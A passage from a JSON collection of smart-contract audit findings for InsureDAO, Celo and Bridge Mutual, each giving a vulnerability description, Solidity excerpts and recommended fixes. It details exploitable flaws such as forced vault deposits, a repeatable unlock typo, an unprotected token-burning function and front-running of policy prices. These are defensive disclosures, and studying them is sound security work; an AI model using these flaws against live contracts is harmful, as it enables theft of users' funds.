IUniversalMarket(\n        _createClone(address(_template))\n    );\n\n    IRegistry(registry).supportMarket(address(market));\n    \n    markets.push(address(market));\n\n\n    //initialize\n    market.initialize(_metaData, _conditions, _references);\n\n    emit MarketCreated(\n        address(market),\n        address(_template),\n        _metaData,\n        _conditions,\n        _references\n    );\n\n    return address(market);\n}\n```\n\n<https://github.com/code-423n4/2022-01-insure/blob/main/contracts/PoolTemplate.sol#L178-L221>\n```solidity\nfunction initialize(\n    string calldata _metaData,\n    uint256[] calldata _conditions,\n    address[] calldata _references\n) external override {\n    require(\n        initialized == false &&\n            bytes(_metaData).length > 0 &&\n            _references[0] != address(0) &&\n            _references[1] != address(0) &&\n            _references[2] != address(0) &&\n            _references[3] != address(0) &&\n            _references[4] != address(0) &&\n            _conditions[0] <= _conditions[1],\n        \"ERROR: INITIALIZATION_BAD_CONDITIONS\"\n    );\n    initialized = true;\n\n    string memory _name = string(\n        abi.encodePacked(\n            \"InsureDAO-\",\n            IERC20Metadata(_references[1]).name(),\n            \"-PoolInsurance\"\n        )\n    );\n    string memory _symbol = string(\n        abi.encodePacked(\"i-\", IERC20Metadata(_references[1]).symbol())\n    );\n    uint8 _decimals = IERC20Metadata(_references[0]).decimals();\n\n    initializeToken(_name, _symbol, _decimals);\n\n    registry = IRegistry(_references[2]);\n    parameters = IParameters(_references[3]);\n    vault = IVault(parameters.getVault(_references[1]));\n\n    metadata = _metaData;\n\n    marketStatus = MarketStatus.Trading;\n\n    if (_conditions[1] > 0) {\n        _depositFrom(_conditions[1], _references[4]);\n    }\n}\n```\n\n#### Tools Used\n\nManual code review.\nDiscussions with kohshiba.\n\n#### Recommended Mitigation Steps\n\nAfter discussions with the sponsor, they have opted to parse a `_creator` address to `PoolTemplate.sol` which will act as the depositor and be set to `msg.sender` in `Factory.createMarket()`. This will prevent malicious market creators from forcing vault deposits from unsuspecting users who are approved in `Factory.sol` and have also approved `Vault.sol` to make transfers on their behalf.\n\n\n**[oishun1112 (Insure) confirmed](https://github.com/code-423n4/2022-01-insure-findings/issues/224):**\n > https://github.com/code-423n4/2022-01-insure-findings/issues/250\n\n\n",
      "summary": "\nThis bug report describes a vulnerability in the Factory.sol contract, which is used to create markets. If a registered template address has the \"isOpen\" value set to true, any user can call the createMarket() function using this template. If the template points to PoolTemplate.sol, a malicious market creator can abuse the PoolTemplate.initialize() function, as it makes a vault deposit from an account they control. This can cause honest market creators to have their tokens transferred to an incorrectly configured market, leading to unrecoverable funds.\n\nTo mitigate this issue, the sponsor has decided to parse a \"_creator\" address to PoolTemplate.sol, which will act as the depositor and be set to \"msg.sender\" in Factory.createMarket(). This will prevent malicious market creators from forcing vault deposits from unsuspecting users who are approved in Factory.sol and have also approved Vault.sol to make transfers on their behalf.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "InsureDAO",
      "source_link": "https://code4rena.com/reports/2022-01-insure",
      "github_link": "https://github.com/code-423n4/2022-01-insure-findings/issues/224",
      "tags": [],
      "finders": [
        "leastwood"
      ]
    },
    {
      "id": "1295",
      "title": "[H-02] Typo in PoolTemplate unlock function results in user being able to unlock multiple times",
      "impact": "HIGH",
      "content": "_Submitted by loop, also found by p4st13r4 and ye0lde_\n\nThe function `unlock()` in PoolTemplate has a typo where it compares `insurances[_id].status` to `false` rather than setting it to `false`. If the conditions are met to unlock the funds for an id, the user should be able to call the `unlock()` function once for that id as `insurances[_id].amount` is subtracted from `lockedAmount`. However, since `insurances[_id].status` does not get set to `false`, a user can call `unlock()` multiple times for the same id, resulting in `lockedAmount` being way smaller than it should be since `insurances[_id].amount` is subtracted multiple times.\n\n#### Impact\n\n`lockedAmount` is used to calculate the amount of underlying tokens available for withdrawals. If `lockedAmount` is lower than it should be users are able to withdraw more underlying tokens than available for withdrawals.\n\n#### Proof of Concept\n\nTypo in `unlock()`:\n\n*   <https://github.com/code-423n4/2022-01-insure/blob/main/contracts/PoolTemplate.sol#L360-L362>\n\nCalculation of underlying tokens available for withdrawal:\n\n*   <https://github.com/code-423n4/2022-01-insure/blob/main/contracts/PoolTemplate.sol#L836>\n\n#### Recommended Mitigation Steps\n\nChange `insurances[_id].status == false;` to `insurances[_id].status = false;`\n\n**[oishun1112 (Insure) confirmed and resolved](https://github.com/code-423n4/2022-01-insure-findings/issues/192):**\n > https://github.com/InsureDAO/pool-contracts/blob/audit/code4rena/contracts/PoolTemplate.sol#L375\n\n**[0xean (judge) commented](https://github.com/code-423n4/2022-01-insure-findings/issues/192#issuecomment-1023658102):**\n > upgrading to sev-3 based on assets being compromised. \n\n\n\n",
      "summary": "\nThis bug report is about a vulnerability found in the function `unlock()` in PoolTemplate. This vulnerability is caused by a typo in the code which compares `insurances[_id].status` to `false` instead of setting it to `false`. This allows a user to call the `unlock()` function multiple times for the same id, resulting in `lockedAmount` being lower than it should be. This means that users are able to withdraw more underlying tokens than available for withdrawals. The proof of concept for this vulnerability can be found in the code at the following links: \n- https://github.com/code-423n4/2022-01-insure/blob/main/contracts/PoolTemplate.sol#L360-L362\n- https://github.com/code-423n4/2022-01-insure/blob/main/contracts/PoolTemplate.sol#L836\n\nThe recommended mitigation step for this vulnerability is to change `insurances[_id].status == false;` to `insurances[_id].status = false;`.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "InsureDAO",
      "source_link": "https://code4rena.com/reports/2022-01-insure",
      "github_link": "https://github.com/code-423n4/2022-01-insure-findings/issues/192",
      "tags": [],
      "finders": [
        "loop",
        "p4st13r4  ye0lde"
      ]
    },
    {
      "id": "1294",
      "title": "[H-01] Tokens can be burned with no access control",
      "impact": "HIGH",
      "content": "_Submitted by sirhashalot_\n\n\nThe Vault.sol contract has two address state variables, the `keeper` variable and the `controller` variable, which are both permitted to be the zero address. If both variables are zero simultaneously, any address can burn the available funds (available funds = balance - totalDebt) by sending these tokens to the zero address with the unprotected `utilitize()` function. If a user has no totalDebt, the user can lose their entire underlying token balance because of this.\n\n#### Proof of Concept\n\nThe problematic `utilize()` function is [found here](https://github.com/code-423n4/2022-01-insure/blob/19d1a7819fe7ce795e6d4814e7ddf8b8e1323df3/contracts/Vault.sol#L342-L352). To see how the two preconditions can occur:\n\n1.  The keeper state variable is only changed by the `setKeeper()` function [found here](https://github.com/code-423n4/2022-01-insure/blob/19d1a7819fe7ce795e6d4814e7ddf8b8e1323df3/contracts/Vault.sol#L502). If this function is not called, the keeper variable will retain the default value of address(0), which bypasses [the only access control for the utilize function](https://github.com/code-423n4/2022-01-insure/blob/19d1a7819fe7ce795e6d4814e7ddf8b8e1323df3/contracts/Vault.sol#L344).\n2.  There is a comment [here on line 69](https://github.com/code-423n4/2022-01-insure/blob/19d1a7819fe7ce795e6d4814e7ddf8b8e1323df3/contracts/Vault.sol#L502https://github.com/code-423n4/2022-01-insure/blob/19d1a7819fe7ce795e6d4814e7ddf8b8e1323df3/contracts/Vault.sol#L502) stating the controller state variable can be zero. There is no zero address check for the controller state variable in the Vault constructor.\n\nIf both address variables are left at their defaults of `address(0)`, then the `safeTransfer()` call [on line 348](https://github.com/code-423n4/2022-01-insure/blob/19d1a7819fe7ce795e6d4814e7ddf8b8e1323df3/contracts/Vault.sol#L348) would send the tokens to address(0).\n\n#### Recommended Mitigation Steps\n\nAdd the following line to the very beginning of the `utilize()` function:\n`require(address(controller) != address(0))`\n\nThis check is already found in many other functions in Vault.sol, including the `_unutilize()` function.\n\n**[oishun1112 (Insure) confirmed and resolved](https://github.com/code-423n4/2022-01-insure-findings/issues/158):**\n > https://github.com/InsureDAO/pool-contracts/blob/audit/code4rena/contracts/Vault.sol#L382\n\n\n\n",
      "summary": "\nThis bug report is about a vulnerability in the Vault.sol contract which allows any address to burn the available funds if both the keeper and controller state variables are set to the zero address. The problematic `utilize()` function is found in the code and can be triggered if the keeper variable is not changed from its default value of address(0) and there is no zero address check for the controller state variable in the Vault constructor. The recommended mitigation step is to add the line `require(address(controller) != address(0))` to the beginning of the `utilize()` function. This check is already found in many other functions in Vault.sol, including the `_unutilize()` function.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "InsureDAO",
      "source_link": "https://code4rena.com/reports/2022-01-insure",
      "github_link": "https://github.com/code-423n4/2022-01-insure-findings/issues/158",
      "tags": [],
      "finders": [
        "sirhashalot"
      ]
    },
    {
      "id": "10964",
      "title": "Release notes inconsistent with release",
      "impact": "LOW",
      "content": "The effects of PR’s [6899](https://github.com/celo-org/celo-monorepo/pull/6899), [6850](https://github.com/celo-org/celo-monorepo/pull/6850), and [7344](https://github.com/celo-org/celo-monorepo/pull/7344) were listed in the [release notes](https://github.com/celo-org/celo-monorepo/releases/tag/celo-core-contracts-v4.pre-audit) as features of the release. But also included in this release is [PR7309](https://github.com/celo-org/celo-monorepo/pull/7309/files) which undoes the changes made by `6899`, `6850`, and the git history of `7344` is not even included in this branch. This means that the effects of PR’s `6899`, `6850`, and `7344` do not appear in this release.\n\n\nWhile the effects of these PR’s are fairly innocuous, the [release-process](https://docs.celo.org/community/release-process/smart-contracts#release-process) of the Celo protocol relies on a governance process where the information in the release notes could sway the electorate. If the effects of the PR’s were less innocuous, such as a patch to a critical vulnerability, their absence in the release approved by the governance process could leave an attack vector open.\n\n\nWe worked with the cLabs team in updating the content of the release notes to eliminate this discrepancy.\n\n\nConsider paying special attention that future release notes correctly document the content of the release.\n\n\n**Update:** *This has been fixed by removing description of the effects of PR’s `6899`, `6850`, and `7344` from the release notes.*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Celo Contracts Audit – Phase 7",
      "source_link": "https://blog.openzeppelin.com/celo-contracts-audit-phase-7/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10963",
      "title": "Function variables could corrupt global variables",
      "impact": "LOW",
      "content": "The helper function [`build_tag`](https://github.com/celo-org/celo-monorepo/blob/1c391af75e37da1108f426b5ff14b4766538c79e/packages/protocol/scripts/bash/release-lib.sh#L3) of the `release-lib.sh` script sets the values of its [`BRANCH`](https://github.com/celo-org/celo-monorepo/blob/1c391af75e37da1108f426b5ff14b4766538c79e/packages/protocol/scripts/bash/release-lib.sh#L4), [`LOG_FILE`](https://github.com/celo-org/celo-monorepo/blob/1c391af75e37da1108f426b5ff14b4766538c79e/packages/protocol/scripts/bash/release-lib.sh#L5), and [`BUILD_DIR`](https://github.com/celo-org/celo-monorepo/blob/1c391af75e37da1108f426b5ff14b4766538c79e/packages/protocol/scripts/bash/release-lib.sh#L8) variables. In Bash, by default [all variables are global](https://bash.cyberciti.biz/guide/Local_variable). Also, Bash functions cannot explicity return strings. So in the scripts that call `build_tag`, [their `BUILD_DIR`](https://github.com/celo-org/celo-monorepo/blob/1c391af75e37da1108f426b5ff14b4766538c79e/packages/protocol/scripts/bash/verify-deployed.sh#L35) variable is understood to take on the value set within the `build_tag` function.\n\n\nCurrently, the `BRANCH` and `LOG_FILE` variables are not used in scripts after their call to `build_tag`. But in future development to scripts using `BRANCH` and `LOG_FILE` variables, calling `build_tag` could unintentionally corrupt their values.\n\n\nConsider defining the `BRANCH` and `LOG_FILE` variables within `build_tag` to be `local` since they are not intended to be used outside the function body.\n\n\n**Update:** *This has been fixed in commit [c273843](https://github.com/celo-org/celo-monorepo/pull/7565/commits/c273843d857025a7837d0dd9c516f9e933835dd6).*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Celo Contracts Audit – Phase 7",
      "source_link": "https://blog.openzeppelin.com/celo-contracts-audit-phase-7/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "32160",
      "title": "The  aggregatedQueueAmount  value is used inconsistently",
      "impact": "MEDIUM",
      "content": "#### Description\n\n\nThe `aggregatedQueueAmount` variable represents the cumulative DAIx amount in the queue that is waiting for the withdrawal. When requesting the withdrawal, this value is used as the amount of DAI that needs to be withdrawn, which may be significantly different:\n\n\n**code\\_new/contracts/PolicyBook.sol:L539-L540**\n\n\n\n```\nrequire(totalLiquidity >= totalCoverTokens.add(aggregatedQueueAmount).add(_daiTokensToWithdraw),\n  \"PB: Not enough available liquidity\");\n\n```\nThat may lead to allowing the withdrawal request even if it shouldn’t be allowed and the opposite.\n\n\n#### Recommendation\n\n\nConvert `aggregatedQueueAmount` to DAI in the `_requestWithdrawal`.",
      "summary": "\nThe bug report explains an issue with a variable called `aggregatedQueueAmount` in a program called `PolicyBook.sol`. This variable represents the amount of DAI (a type of cryptocurrency) that is waiting to be withdrawn. However, when requesting a withdrawal, the program uses this variable as the amount of DAI to be withdrawn, which can sometimes be wrong. This can result in allowing a withdrawal when it shouldn't be allowed, or not allowing a withdrawal when it should be allowed. The recommendation is to convert the `aggregatedQueueAmount` variable to DAI in a specific function called `_requestWithdrawal`. This will help fix the issue.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "Bridge Mutual",
      "source_link": "https://consensys.net/diligence/audits/2021/03/bridge-mutual/",
      "github_link": "",
      "tags": [],
      "finders": [
        "Daniel Luca",
        "Sergii Kravchenko"
      ]
    },
    {
      "id": "13515",
      "title": "Users are incentivised to invest right before the getEndLMTime to join the winning team",
      "impact": "MEDIUM",
      "content": "#### Description\n\n\nWhen investing, there are 3 types of rewards in the `LiquidityMining` contracts: for the top users, for the top teams, for the group leaders in the top teams. EVERY member from the top teams is getting a reward proportional to the provided stake. Only the final snapshot of the stakes is used to determine the leaderboard which is right after the `getEndLMTime`.\n\n\nEveryone can join any team, and everyone’s goal is to go to the winning teams. The best way to do so is to wait right until the end of the period and join the most beneficial team.\n\n\n#### Recommendation\n\n\nIt’s better to avoid extra incentives that create race conditions.",
      "summary": "\nThe LiquidityMining contracts offer three types of rewards: for the top users, for the top teams, and for the group leaders in the top teams. All members of the top teams receive a reward proportional to the stake they provide. The final snapshot of the stakes is taken right after the 'getEndLMTime' to determine the leaderboard.\n\nSince anyone can join any team, people tend to wait until the end of the period to join the most beneficial team. This creates a race condition and it is recommended to avoid such extra incentives.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "Bridge Mutual",
      "source_link": "https://consensys.net/diligence/audits/2021/03/bridge-mutual/",
      "github_link": "",
      "tags": [],
      "finders": [
        "Daniel Luca",
        "Sergii Kravchenko"
      ]
    },
    {
      "id": "13514",
      "title": "The claim can only be done once",
      "impact": "MEDIUM",
      "content": "#### Description\n\n\nWhen the claim happens, the policy is removed afterward:\n\n\n**code\\_new/contracts/PolicyBook.sol:L222-L237**\n\n\n\n```\nfunction commitClaim(address claimer, uint256 claimAmount)\n  external \n  override\n  onlyClaimVoting\n  updateBMIDAIXStakingReward\n{\n  PolicyHolder storage holder = policyHolders[claimer];\n\n  epochAmounts[holder.endEpochNumber] = epochAmounts[holder.endEpochNumber].sub(holder.coverTokens);\n  totalLiquidity = totalLiquidity.sub(claimAmount);\n \n  daiToken.transfer(claimer, claimAmount);\n                 \n  delete policyHolders[claimer];\n  policyRegistry.removePolicy(claimer);\n}\n\n```\nIf the claim amount is much lower than the coverage, the users are incentivized not to submit it and wait until the end of the coverage period to accumulate all the claims into one.\n\n\n#### Recommendation\n\n\nAllow the policyholders to submit multiple claims until the `coverTokens` is not reached.",
      "summary": "\nA bug has been identified in the code of the PolicyBook.sol contract which affects the policyholder when a claim is made. The code removes the policy after the claim is made, even if the claim amount is much lower than the coverage amount. This incentivizes users to wait until the end of the coverage period to submit all the claims at once. The recommendation is to allow policyholders to submit multiple claims until the coverTokens is not reached.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "Bridge Mutual",
      "source_link": "https://consensys.net/diligence/audits/2021/03/bridge-mutual/",
      "github_link": "",
      "tags": [],
      "finders": [
        "Daniel Luca",
        "Sergii Kravchenko"
      ]
    },
    {
      "id": "13513",
      "title": "The aggregatedQueueAmount  value is used inconsistently",
      "impact": "MEDIUM",
      "content": "#### Description\n\n\nThe `aggregatedQueueAmount` variable represents the cumulative DAIx amount in the queue that is waiting for the withdrawal. When requesting the withdrawal, this value is used as the amount of DAI that needs to be withdrawn, which may be significantly different:\n\n\n**code\\_new/contracts/PolicyBook.sol:L539-L540**\n\n\n\n```\nrequire(totalLiquidity >= totalCoverTokens.add(aggregatedQueueAmount).add(\\_daiTokensToWithdraw),\n  \"PB: Not enough available liquidity\");\n\n```\nThat may lead to allowing the withdrawal request even if it shouldn’t be allowed and the opposite.\n\n\n#### Recommendation\n\n\nConvert `aggregatedQueueAmount` to DAI in the `_requestWithdrawal`.",
      "summary": "\nThe bug report describes an issue with the `aggregatedQueueAmount` variable in the code_new/contracts/PolicyBook.sol file. This variable represents the cumulative DAIx amount in the queue that is waiting for the withdrawal. However, when requesting the withdrawal, this value is used as the amount of DAI that needs to be withdrawn, which may be significantly different. This could lead to allowing a withdrawal request even if it shouldn’t be allowed, or the opposite.\n\nThe recommendation is to convert `aggregatedQueueAmount` to DAI in the `_requestWithdrawal` function. This will ensure that the correct amount of DAI is withdrawn, and that withdrawal requests are only allowed when they should be.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "Bridge Mutual",
      "source_link": "https://consensys.net/diligence/audits/2021/03/bridge-mutual/",
      "github_link": "",
      "tags": [],
      "finders": [
        "Daniel Luca",
        "Sergii Kravchenko"
      ]
    },
    {
      "id": "13512",
      "title": "The price and the duration of a policy may be unpredictable",
      "impact": "MEDIUM",
      "content": "#### Description\n\n\nWhen the user is buying a policy, the price is calculated based on the current liquidity/coverage ratio, and the duration is calculated based on the current timestamp. A malicious actor can front-run the buyer (e.g., buy short-term insurance with a huge coverage) and increase the policy’s price. Or the transaction can be executed much later for some reason, and the number of the `totalSeconds` may be larger, the coverage period can be between `_epochsNumber - 1` and `_epochsNumber`.\n\n\n#### Recommendation\n\n\nGiven the unpredictability of the price, it’s better to pass the hard limit for the insurance price as a parameter. Also, as an opinion, you can add a deadline for the transaction as a parameter.",
      "summary": "\nThis bug report describes a potential security vulnerability in a policy buying system. It is possible for a malicious actor to front-run the buyer, meaning they can buy short-term insurance with a large coverage and increase the policy's price. Additionally, if the transaction takes longer than expected, the coverage period could be longer than the expected amount of time. \n\nThe report recommends passing a hard limit for the insurance price as a parameter, as well as adding a deadline for the transaction as a parameter. This would help to ensure that users are not charged an unexpected amount for the policy, and that the coverage period is not longer than expected.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "Bridge Mutual",
      "source_link": "https://consensys.net/diligence/audits/2021/03/bridge-mutual/",
      "github_link": "",
      "tags": [],
      "finders": [
        "Daniel Luca",
        "Sergii Kravchenko"
      ]
    },
    {
      "id": "13511",
      "title": "Proper usage of the transfer and the transferFrom functions",
      "impact": "MEDIUM",
      "content": "#### Description\n\n\nMany ERC-20 transfers in the code are just called without checking the return values:\n\n\n**code\\_new/contracts/PolicyBook.sol:L269-L270**\n\n\n\n```\ndaiToken.transferFrom(\\_msgSender(), reinsurancePoolAddress, \\_reinsurancePrice);\ndaiToken.transferFrom(\\_msgSender(), address(this), \\_price);   \n\n```\n**code\\_new/contracts/PolicyBook.sol:L556-L559**\n\n\n\n```\nfunction \\_unlockTokens(uint256 \\_amountToUnlock) internal {\n  this.transfer(\\_msgSender(), \\_amountToUnlock);\n  delete withdrawalsInfo[\\_msgSender()];\n}\n\n```\n**code\\_new/contracts/LiquidityMining.sol:L278**\n\n\n\n```\nbmiToken.transfer(msg.sender, \\_userReward);\n\n```\nEven though the tokens in these calls are not arbitrary (DAI, BMI, DAIx, stkBMIToken) and probably always return `True` or call `revert`, it’s still better to comply with the ERC-20 standard and make sure that the transfer went well.\n\n\n#### Recommendation\n\n\nThe best solution would be better to always use the safe version of the transfers from `openzeppelin/contracts/token/ERC20/SafeERC20.sol`.",
      "summary": "\nThis bug report is related to the ERC-20 transfers in the code. In the code, the transfers are called without checking the return values, even though the tokens are not arbitrary (DAI, BMI, DAIx, stkBMIToken) and probably always return `True` or call `revert`. To comply with the ERC-20 standard, it is recommended to use the safe version of the transfers from `openzeppelin/contracts/token/ERC20/SafeERC20.sol`. This will ensure that the transfer went well and help to prevent any potential issues.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "Bridge Mutual",
      "source_link": "https://consensys.net/diligence/audits/2021/03/bridge-mutual/",
      "github_link": "",
      "tags": [],
      "finders": [
        "Daniel Luca",
        "Sergii Kravchenko"
      ]
    },
    {
      "id": "13510",
      "title": "Optimization issue",
      "impact": "MEDIUM",
      "content": "#### Description\n\n\nThe codebase is huge, and there are still a lot of places where these complications and gas efficiency can be improved.\n\n\n#### Examples\n\n\n* `_updateTopUsers`, `_updateGroupLeaders`, `_updateLeaderboard` are having a similar mechanism of adding users to a sorted set which makes more storage operations than needed:\n\n\n**code\\_new/contracts/LiquidityMining.sol:L473-L486**\n\n\n\n```\nuint256 \\_tmpIndex = \\_currentIndex - 1;\nuint256 \\_currentUserAmount = usersTeamInfo[msg.sender].stakedAmount;\n \nwhile (\\_currentUserAmount > usersTeamInfo[topUsers[\\_tmpIndex]].stakedAmount) {\n    address \\_tmpAddr = topUsers[\\_tmpIndex];\n    topUsers[\\_tmpIndex] = msg.sender;\n    topUsers[\\_tmpIndex + 1] = \\_tmpAddr;\n \n    if (\\_tmpIndex == 0) {\n        break;\n    }\n \n    \\_tmpIndex--;\n}\n\n```\nInstead of doing 2 operations per item that is lower than the new\\_item, same can be done with one operation: while `topUsers[_tmpIndex]` is lower than the new item`topUsers[_tmpIndex + 1] = topUsers[_tmpIndex]`.\n* creating the Queue library looks like overkill for the intended task. It is only used for the withdrawal queue in the PolicyBook. The structure stores and processes extra data, which is unnecessary and more expensive. A larger codebase also has a higher chance of introducing a bug (and it happened here <https://github.com/ConsenSys/bridge-mutual-audit-2021-03/issues/25)>. It’s usually better to have a simpler and optimized version like described here [issue 5.14](#the-_removefromqueue-is-very-gas-greedy).\n* There are a few `for` loops that are using `uint8` iterators. It’s unnecessary and can be even more expensive because, under the hood, it’s additionally converted to `uint256` all the time. In general, shrinking data to `uint8` makes sense to optimize storage slots, but that’s not the case here.\n* The value that is calculated in a loop can be obtained simpler by just having a 1-line formula:\n\n\n**code\\_new/contracts/LiquidityMining.sol:L351-L367**\n\n\n\n```\nfunction \\_getAvailableMonthForReward(address \\_userAddr) internal view returns (uint256) {\n    uint256 \\_oneMonth = 30 days;\n    uint256 \\_startRewardTime = getEndLMTime();\n \n    uint256 \\_countOfRewardedMonth = countsOfRewardedMonth[usersTeamInfo[\\_userAddr].teamAddr][\\_userAddr];\n    uint256 \\_numberOfMonthForReward;\n \n    for (uint256 i = \\_countOfRewardedMonth; i < MAX\\_MONTH\\_TO\\_GET\\_REWARD; i++) {\n        if (block.timestamp > \\_startRewardTime.add(\\_oneMonth.mul(i))) {\n        \\_numberOfMonthForReward++;\n        } else {\n            break;\n        }\n    }\n \n    return \\_numberOfMonthForReward;\n}\n\n```\n* The mapping is using 2 keys, but the first key is strictly defined by the second one, so there’s no need for it:\n\n\n**code\\_new/contracts/LiquidityMining.sol:L60-L61**\n\n\n\n```\n// Referral link => Address => count of rewarded month\nmapping (address => mapping (address => uint256)) public countsOfRewardedMonth;\n\n```\n* There are a lot of structures in the code with duplicated and unnecessary data, for example:\n\n\n**code\\_new/contracts/LiquidityMining.sol:L42-L48**\n\n\n\n```\nstruct UserTeamInfo {\n    string teamName;\n    address teamAddr;\n \n    uint256 stakedAmount;\n    bool isNFTDistributed;\n}\n\n```\nHere the structure is created for every team member, duplicating the team name for each member.\n\n\n#### Recommendation\n\n\nOptimize and simplify the code.",
      "summary": "\nThis bug report is about a codebase that can be improved in terms of gas efficiency. There are several examples provided of how the code can be optimized and simplified. For instance, `_updateTopUsers`, `_updateGroupLeaders`, and `_updateLeaderboard` can be optimized by reducing the number of storage operations. Additionally, the Queue library is unnecessary and can be replaced with a simpler version. There are also for loops using `uint8` iterators that can be replaced with `uint256` for better efficiency. Furthermore, a 1-line formula can be used to calculate the value instead of a loop. Lastly, a mapping with two keys is unnecessary since the first key is strictly defined by the second one. The recommendation is to optimize and simplify the code.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "Bridge Mutual",
      "source_link": "https://consensys.net/diligence/audits/2021/03/bridge-mutual/",
      "github_link": "",
      "tags": [],
      "finders": [
        "Daniel Luca",
        "Sergii Kravchenko"
      ]
    },
    {
      "id": "13509",
      "title": "The Queue remove function does not remove the item completely",
      "impact": "HIGH",
      "content": "#### Description\n\n\nWhen removing an item in a queue, the following function is used:\n\n\n**code\\_new/contracts/helpers/Queue.sol:L78-L98**\n\n\n\n```\nfunction remove(UniqueAddressQueue storage baseQueue, address addrToRemove) internal returns (bool) {\n    if (!contains(baseQueue, addrToRemove)) {\n        return false;\n    }\n\n    if (baseQueue.HEAD == addrToRemove) {\n        return removeFirst(baseQueue);\n    }\n\n    if (baseQueue.TAIL == addrToRemove) {\n        return removeLast(baseQueue);\n    }\n\n    address prevAddr = baseQueue.queue[addrToRemove].prev;\n    address nextAddr = baseQueue.queue[addrToRemove].next;\n    baseQueue.queue[prevAddr].next = nextAddr;\n    baseQueue.queue[nextAddr].prev = prevAddr;\n    baseQueue.queueLength--;\n\n    return true;\n}\n\n```\nAs the result, the `baseQueue.queue[addrToRemove]` is not deleted, so the `contains` function will still return `True` after the removal.\n\n\n#### Recommendation\n\n\nRemove the element from the queue completely.",
      "summary": "\nThe bug report is about an issue with the function `remove` in the code `code_new/contracts/helpers/Queue.sol:L78-L98` when removing an item in a queue. The issue is that the element is not deleted from the queue completely, which means that the `contains` function will still return `True` after the removal. The recommendation to fix this bug is to remove the element from the queue completely.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "Bridge Mutual",
      "source_link": "https://consensys.net/diligence/audits/2021/03/bridge-mutual/",
      "github_link": "",
      "tags": [],
      "finders": [
        "Daniel Luca",
        "Sergii Kravchenko"
      ]
    },
    {
      "id": "13508",
      "title": "The totalCoverTokens is not decreased after the claim happened",
      "impact": "HIGH",
      "content": "#### Description\n\n\nWhen the claim happens and the policy is removed, the `totalCoverTokens` should be decreased instantly, that’s why the scheduled reduction value is removed:\n\n\n**code\\_new/contracts/PolicyBook.sol:L228-L236**\n\n\n\n```\nPolicyHolder storage holder = policyHolders[claimer];\n\nepochAmounts[holder.endEpochNumber] = epochAmounts[holder.endEpochNumber].sub(holder.coverTokens);\ntotalLiquidity = totalLiquidity.sub(claimAmount);\n\ndaiToken.transfer(claimer, claimAmount);\n               \ndelete policyHolders[claimer];\npolicyRegistry.removePolicy(claimer);\n\n```\nBut the `totalCoverTokens` is not changed and will have the coverage from the removed policy forever.\n\n\n#### Recommendation\n\n\nDecrease the `totalCoverTokens` inside the `commitClaim` function.",
      "summary": "\nThis bug report is about a problem with the PolicyBook.sol contract. When a policy is removed, the totalCoverTokens should decrease instantly, but it is not changing and will have the coverage from the removed policy forever. The code snippet provided shows the code in the commitClaim function, which is responsible for the policy removal. The recommendation is to decrease the totalCoverTokens inside the commitClaim function.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "Bridge Mutual",
      "source_link": "https://consensys.net/diligence/audits/2021/03/bridge-mutual/",
      "github_link": "",
      "tags": [],
      "finders": [
        "Daniel Luca",
        "Sergii Kravchenko"
      ]
    },
    {
      "id": "13507",
      "title": "The totalCoverTokens can be decreased before the claim is committed",
      "impact": "HIGH",
      "content": "#### Description\n\n\nThe `totalCoverTokens` is decreased right after the policy duration ends (`_endEpochNumber`). When that happens, the liquidity providers can withdraw their funds:\n\n\n**code\\_new/contracts/PolicyBook.sol:L262-L265**\n\n\n\n```\npolicyHolders[\\_msgSender()] = PolicyHolder(\\_coverTokens, currentEpochNumber,\n  \\_endEpochNumber, \\_totalPrice, \\_reinsurancePrice);\n\nepochAmounts[\\_endEpochNumber] = epochAmounts[\\_endEpochNumber].add(\\_coverTokens);\n\n```\n**code\\_new/contracts/PolicyBook.sol:L343-L351**\n\n\n\n```\nuint256 \\_countOfPassedEpoch = block.timestamp.sub(epochStartTime).div(EPOCH\\_DURATION);\n\nnewTotalCoverTokens = totalCoverTokens;\nlastEpochUpdate = currentEpochNumber;\nnewEpochNumber = \\_countOfPassedEpoch.add(1);\n\nfor (uint256 i = lastEpochUpdate; i < newEpochNumber; i++) {\n  newTotalCoverTokens = newTotalCoverTokens.sub(epochAmounts[i]);     \n}\n\n```\nOn the other hand, the claim can be created while the policy is still “active”. And is considered active until one week after the policy expired:\n\n\n**code\\_new/contracts/PolicyRegistry.sol:L50-L58**\n\n\n\n```\nfunction isPolicyActive(address \\_userAddr, address \\_policyBookAddr) public override view returns (bool) {\n  PolicyInfo storage \\_currentInfo = policyInfos[\\_userAddr][\\_policyBookAddr];\n\n  if (\\_currentInfo.endTime == 0) {\n    return false;\n  }\n\n  return \\_currentInfo.endTime.add(STILL\\_CLAIMABLE\\_FOR) > block.timestamp;\n}\n\n```\nBy the time when the claim is created + voted, the liquidity provider can potentially withdraw all of their funds already, and the claim will fail.\n\n\n#### Recommendation\n\n\nMake sure that there will always be enough funds for the claim.",
